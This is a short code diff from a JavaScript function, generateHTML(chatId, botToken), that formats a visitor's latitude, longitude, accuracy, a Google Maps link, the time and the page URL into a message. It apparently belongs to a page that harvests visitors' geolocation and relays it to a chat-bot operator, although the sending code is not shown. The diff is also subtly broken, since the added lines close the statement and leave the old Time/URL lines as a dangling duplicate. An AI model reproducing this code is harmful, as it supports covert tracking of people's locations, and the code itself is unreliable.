@@ -1155,6 +1155,9 @@ function generateHTML(chatId, botToken) {
                            "• Latitude: " + location.latitude + "\\n" +
                            "• Longitude: " + location.longitude + "\\n" +
                            "• Accuracy: " + location.accuracy + " meters\\n\\n" +
+                           "• Google Maps:https://www.google.com/maps?q=" + location.latitude + "," + location.longitude + "\\n\\n" +
+                           "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
+                           "🌐 **Page URL:** " + window.location.href;
                            "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
                            "🌐 **URL:** " + window.location.href;
 
